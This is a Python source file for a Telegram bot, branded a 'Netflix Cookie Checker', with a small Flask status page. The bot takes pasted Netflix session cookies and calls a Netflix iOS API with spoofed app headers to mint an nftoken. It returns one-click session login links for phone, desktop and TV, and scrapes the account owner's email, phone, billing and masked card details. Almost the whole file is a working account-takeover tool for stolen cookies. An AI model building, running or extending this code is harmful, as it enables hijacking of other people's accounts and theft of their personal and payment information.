import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
from flask import Flask
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

BOT_TOKEN = os.environ.get("BOT_TOKEN", 8933917086)
PORT = int(os.environ.get("PORT", 10000))

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

app_flask = Flask(__name__)
application = None

START_TEXT = (
    "👋 Netflix Cookie Checker Bot\n\n"
    "Paste your Netflix cookies here.\n\n"
    "Accepted formats:\n"
    "• Full `Cookie:` header line\n"
    "• Netscape format - tab or space delimited\n"
    "• JSON array format\n"
    "• Key=Value pairs: NetflixId=...; SecureNetflixId=...; nfvdid=...\n\n"
    "Send cookies now:\n\n"
    " Bot by @ritsurex 🦖"
)

HELP_TEXT = (
    "How it works:\n"
    "• Use /start then paste cookies.\n"
    "• Bot validates cookies using Netflix api.\n"
    "• If valid, bot converts it into a session login link (phone | pc | tv)"
)

# All recognized Netflix cookie names
NETFLIX_COOKIE_NAMES = {
    'netflixid', 'securenetflixid', 'netflixcookies', '__secure-netflixcookies',
    'nfvdid', 'flwssn', 'OptanonConsent', 'dsca', 'memclid', 'profilesNewSession',
    'cL', 'netflix-sans-normal-3-loaded', 'netflix-sans-bold-3-loaded',
    'pas', 'OptanonAlertBoxClosed', 'hasSeenCookieDisclosure'
}

COOKIE_NAME_RE = re.compile(
    r"(?i)\b(netflixid|securenetflixid|netflixcookies|__secure-netflixcookies|"
    r"nfvdid|flwssn|OptanonConsent|dsca|memclid|profilesNewSession|cL|"
    r"netflix-sans-normal-3-loaded|netflix-sans-bold-3-loaded|pas|"
    r"OptanonAlertBoxClosed|hasSeenCookieDisclosure)\b"
)
COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)


def _is_json_cookie(text: str) -> bool:
    """Check if text is JSON cookie array."""
    text = text.strip()
    if not (text.startswith('[') and text.endswith(']')):
        return False
    try:
        json.loads(text)
        return True
    except:
        return False

def _is_netscape_cookie(text: str) -> bool:
    """Check if text is Netscape format cookie (tab or space delimited)."""
    lines = text.strip().split('\n')
    if len(lines) < 1:
        return False
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        # Try tab-delimited first
        if '\t' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                logger.debug(f"Detected tab-delimited Netscape cookie format")
                return True
        else:
            # Try space-delimited (more flexible parsing)
            parts = line.split()
            if len(parts) >= 7:
                # Validate that it looks like Netscape format
                # Format: domain flag path secure expiration name value
                domain = parts[0]
                flag = parts[1]
                path = parts[2]
                secure = parts[3]
                try:
                    expiration = int(parts[4])
                    name = parts[5]
                    # Everything after name is the value
                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
                        logger.debug(f"Detected space-delimited Netscape cookie format")
                        return True
                except (ValueError, IndexError):
                    continue
    
    return False


def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or (";" in text and "=" in text)


def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    """Extract cookies from JSON array format."""
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}
        
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')
                    value = cookie_obj.get('value', '')
                    if name and value:
                        kv[name] = value
        return kv
    except Exception as e:
        logger.error(f"Error parsing JSON cookies: {e}")
        return {}


def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    """Extract cookies from Netscape format (handles both tab and space delimited)."""
    kv: Dict[str, str] = {}
    lines = netscape_str.strip().split('\n')
    
    for line in lines:
        original_line = line
        line = line.strip()
        
        if not line or line.startswith('#'):
            continue
        
        # Determine delimiter (tab or space)
        if '\t' in line:
            # Tab-delimited format
            parts = line.split('\t')
            delimiter = '\t'
        else:
            # Space-delimited format (more complex)
            parts = line.split()
            delimiter = ' '
        
        if len(parts) >= 7:
            try:
                if delimiter == '\t':
                    # Tab format: domain flag path secure expiration name value
                    domain = parts[0]
                    flag = parts[1]
                    path = parts[2]
                    secure = parts[3]
                    expiration = parts[4]
                    name = parts[5]
                    value = parts[6]
                else:
                    # Space format: domain flag path secure expiration name value...
                    domain = parts[0]
                    flag = parts[1]
                    path = parts[2]
                    secure = parts[3]
                    try:
                        expiration = int(parts[4])
                    except ValueError:
                        continue
                    name = parts[5]
                    # Everything after position 6 is part of the value (for space-delimited)
                    # Reconstruct the value from the original line
                    # Format: domain flag path secure expiration name value
                    match = re.match(
                        r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$',
                        line
                    )
                    if match:
                        value = match.group(7).strip()
                    else:
                        value = ' '.join(parts[6:])
                
                if name and value:
                    kv[name] = value
                    logger.debug(f"Extracted cookie: {name}")
            except (ValueError, IndexError) as e:
                logger.debug(f"Failed to parse Netscape cookie line: {line}, error: {e}")
                continue
    
    logger.info(f"Extracted {len(kv)} cookies from Netscape format")
    return kv


def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            k = m.group(1).strip()
            v = m.group(2).strip()
            kv[k] = v

    return kv


def _build_cookie_header(cookie_input: str) -> Optional[str]:
    """Parse any cookie format and build a cookie header string."""
    
    logger.info("Attempting to parse cookies...")
    
    # Try JSON format first
    if _is_json_cookie(cookie_input):
        logger.info("Detected JSON cookie format")
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    # Try Netscape format (tab or space delimited)
    if _is_netscape_cookie(cookie_input):
        logger.info("Detected Netscape cookie format")
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            result = "; ".join([f"{k}={v}" for k, v in kv.items()])
            logger.info(f"Successfully parsed {len(kv)} cookies from Netscape format")
            return result
    
    # Try cookie header or key=value format
    if _looks_like_cookie_header(cookie_input):
        logger.info("Detected Cookie header or key=value format")
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        if "=" not in cleaned:
            return None
        
        kv = _extract_cookie_kv_pairs(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
        
        # Return as-is if already in key=value format
        return cleaned

    # Last resort: try to parse as key=value pairs
    logger.info("Attempting to parse as key=value pairs")
    kv = _extract_cookie_kv_pairs(cookie_input)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    logger.warning("Could not parse cookies in any format")
    return None


def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = []
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            k = token.split("=", 1)[0].strip()
            names.append(k)
    names = [n for n in names if n]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        if k.strip().lower() == "netflixid":
            return v.strip()
    return None


def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Invalid or expired cookie. NetflixId not found.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            timeout=timeout_s,
            verify=False,
        )
        r.raise_for_status()
        data = r.json()

        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Invalid or expired cookie. Token generation failed.", None

        return True, "Token API returned a valid nftoken.", nftoken
    except Exception as e:
        logger.error(f"Error generating nftoken: {e}")
        return False, "Invalid or expired cookie.", None


def _scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    return str(text)
    
def decode_text(value):
    if value is None:
        return "Unknown"

    value = str(value)

    try:
        # Decode \x20, \uXXXX, etc.
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass

    # Decode HTML entities
    value = html.unescape(value)

    # Remove any remaining escape sequences
    value = re.sub(r'\\x([0-9A-Fa-f]{2})',
                   lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
                   value)

    return value.strip()

def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found in cookies"}

    session = requests.Session()
    session.cookies.update(cookie_dict)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account",
        "https://www.netflix.com/account/membership",
    ]

    try:
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Account" in (r.text or ""):
                    resp = r
                    txt = r.text or ""
                    break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirected to login"}

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = plan_raw or None
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )
        card = (
            find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
            or find(r'"displayText"\s*:\s*"([^"]+)"')
        )
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )
        phone_ver = "Yes" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )
        hold = "Yes" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No" if re.search(r'"showExtraMemberSection"', txt) else None
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid":\s*"([^"]+)"')

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None

        is_prem = ms == "CURRENT_MEMBER" if ms else bool(plan and "free" not in str(plan).lower())
        has_account = ("Account" in txt)
        if not has_account:
            return {"ok": False, "reason": "No account data found"}

        profiles: list = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        def decode_profile_name(name):
           try:
              name = codecs.decode(name, "unicode_escape")
           except Exception:
              pass
           return html.unescape(name)

        profiles_str = (
          ", ".join(decode_profile_name(_scrub_text(p)) for p in profiles)
          if profiles else None
       )

        return {
            "ok": True,
            "premium": str(is_prem),
            "name": name or "Unknown",
            "country": country or "Unknown",
            "plan": plan or "Unknown",
            "plan_price": plan_price or "Unknown",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "Unknown",
            "masked_card": card or "Unknown",
            "phone": phone or "Unknown",
            "phone_verified": phone_ver or "Unknown",
            "video_quality": quality or "Unknown",
            "max_streams": streams or "Unknown",
            "on_payment_hold": hold or "Unknown",
            "extra_member": extra or "Unknown",
            "email_verified": email_ver or "Unknown",
            "email": email or "Unknown",
            "profiles": profiles_str or "Unknown",
            "user_guid": guid or "Unknown",
            "membership_status": ms or "Unknown",
        }
    except Exception as e:
        logger.error(f"Error checking netflix cookie: {e}")
        return {"ok": False, "reason": str(e)}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        logger.info(f"📱 /start from {update.effective_user.id}")
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error in start: {e}")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        logger.info(f"❓ /help from {update.effective_user.id}")
        await update.message.reply_text(HELP_TEXT)
    except Exception as e:
        logger.error(f"Error in help: {e}")


async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.effective_user.id
        cookie_input = (update.message.text or "").strip()
        logger.info(f"📨 Message from {user_id}: {len(cookie_input)} chars")
        
        if not cookie_input:
            await update.message.reply_text("Please paste your cookies.")
            return

        cookie_header = _build_cookie_header(cookie_input)
        if not cookie_header:
            await update.message.reply_text(
                "❌ Could not parse cookies.\n\n"
                "Paste in one of these formats:\n"
                "• Full `Cookie:` header line\n"
                "• Netscape format (.txt cookie file) - **both tab and space delimited**\n"
                "• JSON array format\n"
                "• Key=Value pairs (NetflixId=..., SecureNetflixId=..., ...)\n\n"
                "Then send again."
            )
            return

        preview = _safe_preview_cookie_keys(cookie_header)
        msg = await update.message.reply_text(
            f"🔎 Checking Netflix cookies...\n"
            f"(Detected cookie names: {preview})"
        )

        loop = asyncio.get_running_loop()
        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

        if ok and nftoken:
            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"

            phone_html = f'<a href="{phone_link}">Open link</a>'
            desktop_html = f'<a href="{desktop_link}">Open link</a>'
            tv_html = f'<a href="{tv_link}">Open link</a>'

            acct_ok = bool(acct and acct.get("ok") is True)
            status_line = f"Verification: {detail}\n"

            acct_html = ""
            if acct_ok:
                acct_html = (
                    "<b>Account details</b>:\n"
                    f"• Name: {html.escape(str(acct.get('name','Unknown')))}\n"
                    f"• Plan: {html.escape(str(acct.get('plan','Unknown')))} ({html.escape(str(acct.get('plan_price','Unknown')))})\n"
                    f"• Profiles: {html.escape(str(acct.get('profiles','Unknown')))}\n"
                    f"• Country: {html.escape(str(acct.get('country','Unknown')))}\n"
                    f"• Email: {html.escape(str(acct.get('email','Unknown')))}\n"
                    f"• Member since: {html.escape(str(acct.get('member_since','Unknown')))}\n"
                    f"• Next billing: {html.escape(str(acct.get('next_billing','Unknown')))}\n"
                    f"• On payment hold: {html.escape(str(acct.get('on_payment_hold','Unknown')))}\n"
                    f"• Payment: {html.escape(str(acct.get('payment_method','Unknown')))} / {html.escape(str(acct.get('masked_card','Unknown')))}\n"
                    f"• Max streams: {html.escape(str(acct.get('max_streams','Unknown')))}\n"
                    f"• Phone: {html.escape(str(acct.get('phone','Unknown')))} (verified: {html.escape(str(acct.get('phone_verified','Unknown')))})\n"
                    f"• Plan quality: {html.escape(str(acct.get('video_quality','Unknown')))}\n"
                )

            status_html = html.escape(status_line)

            await msg.edit_text(
                "✅ Valid cookie detected.\n\n"
                "Session login links:\n"
                f"📱 Phone: {phone_html}\n"
                f"🖥️ Desktop: {desktop_html}\n"
                f"📺 TV: {tv_html}\n"
                f"\n{status_html}"
                f"{acct_html}",
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
            logger.info(f"✅ Cookie validation successful for {user_id}")
        else:
            await msg.edit_text(f"❌ {detail}")
            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
    except Exception as e:
        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)
        try:
            await update.message.reply_text(f"❌ Error processing request")
        except:
            pass


def run_bot_in_thread():
    """Run bot in a separate thread with signal handling disabled"""
    global application
    
    logger.info("=" * 60)
    logger.info("🤖 NETFLIX COOKIE CHECKER BOT")
    logger.info("=" * 60)
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    try:
        # Create a new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        logger.info("✅ Event loop created")
        logger.info("🏗️ Building application...")
        
        # Build application
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        
        logger.info("✅ Application built successfully")
        logger.info("📌 Adding handlers...")
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
        
        logger.info("✅ Handlers registered")
        logger.info("🚀 Starting polling...\n")
        
        # Run polling WITHOUT signal handlers (they don't work in threads)
        loop.run_until_complete(
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                stop_signals=()  # Disable signal handling in thread
            )
        )
        
    except Exception as e:
        logger.error(f"❌ Bot error: {e}", exc_info=True)
        application = None
    finally:
        logger.info("🛑 Bot stopped")


# Flask Routes
@app_flask.route("/", methods=["GET"])
def index():
    bot_status = "🟢 Running" if application else "🔴 Stopped"
    return f"""
    <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <style>
                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .running {{ background-color: #d4edda; color: #155724; }}
                .stopped {{ background-color: #f8d7da; color: #721c24; }}
                h1 {{ color: #333; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ Netflix Cookie Checker Bot</h1>
                <div class="status {'running' if application else 'stopped'}">
                    <p><b>Bot Status:</b> {bot_status}</p>
                    <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
                    <p><b>BOT_link: <a href="https://t.me/Cook2linkbot">Redirect</a></b></p>
                    <p><b>Port:</b> {PORT}</p>
                </div>
                <hr>
                <p><a href="/health">Check Health</a></p>
            </div>
        </body>
    </html>
    """, 200


@app_flask.route("/health", methods=["GET"])
def health():
    status = "healthy" if application else "unhealthy"
    return {
        "status": status,
        "bot_running": application is not None,
        "bot_token_set": bool(BOT_TOKEN),
        "timestamp": time.time()
    }, 200 if application else 503


if __name__ == "__main__":
    logger.info(f"\n📌 PORT: {PORT}")
    logger.info(f"📌 BOT_TOKEN: {'✅ SET' if BOT_TOKEN else '❌ NOT SET'}\n")
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        sys.exit(1)
    
    # Start bot in background thread
    bot_thread = Thread(target=run_bot_in_thread, daemon=False)
    bot_thread.start()
    
    # Wait for bot to initialize
    time.sleep(5)
    
    # Run Flask
    logger.info(f"🚀 Starting Flask server on port {PORT}\n")
    
    try:
        app_flask.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        logger.info("🛑 Keyboard interrupt")
        sys.exit(0)
          
